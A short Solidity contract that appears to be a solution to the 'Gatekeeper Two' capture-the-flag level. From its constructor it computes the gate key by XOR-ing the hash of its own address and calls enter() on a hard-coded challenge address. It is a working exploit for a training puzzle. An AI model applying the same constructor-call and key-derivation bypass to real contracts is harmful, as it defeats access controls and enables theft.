// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatKeeperTwo.sol";

contract Test {
    GatekeeperTwo public gatekeepertwo;

    constructor() public {
        gatekeepertwo = GatekeeperTwo(
            0xFbcFC31a63672cF5a58B35EEfA37e072B7584476
        );
        uint64 mx = 18446744073709551615;
        uint64 x = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 keyresult = x ^ mx;
        gatekeepertwo.enter(bytes8(keyresult));
    }
}
